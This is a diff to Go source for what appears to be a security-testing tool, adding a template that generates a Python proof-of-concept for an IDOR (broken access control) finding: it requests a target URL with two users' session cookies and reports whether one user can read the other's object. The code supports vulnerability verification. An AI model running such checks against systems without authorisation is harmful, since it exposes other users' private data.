@@ -143,6 +143,45 @@ if __name__ == "__main__":
     raise SystemExit(main())
 `, targetURL, targetURL), true
 
+	case "idor":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - IDOR / Broken Access Control (dihasilkan xyland)
+Sesi dibaca dari ENV (tidak ada kredensial di file ini):
+  XYLAND_COOKIE_A="session=..." XYLAND_COOKIE_B="session=..." python3 poc.py
+Target : %s
+Exit   : 0=confirmed (B membaca objek A) | 2=false positive | 3=inconclusive
+"""
+import os, urllib.request, urllib.error
+
+URL = %q
+
+def fetch(u, cookie):
+    try:
+        req = urllib.request.Request(u, headers={"Cookie": cookie, "User-Agent": "xyland-poc"})
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return r.status, r.read().decode("utf-8", "ignore")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "ignore")
+    except Exception:
+        return None, ""
+
+def main():
+    a = os.environ.get("XYLAND_COOKIE_A"); b = os.environ.get("XYLAND_COOKIE_B")
+    if not a or not b:
+        print("VERDICT: INCONCLUSIVE (env sesi belum diisi)"); return 3
+    sa, own = fetch(URL, a)
+    sb, cross = fetch(URL, b)
+    if sa != 200 or sb != 200 or not own:
+        print("VERDICT: INCONCLUSIVE"); return 3
+    if own.strip() == cross.strip():
+        print("VERDICT: CONFIRMED (sesi B membaca objek sesi A)"); return 0
+    print("VERDICT: FALSE_POSITIVE"); return 2
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
+
 	case "sqli":
 		return fmt.Sprintf(`#!/usr/bin/env python3
 """
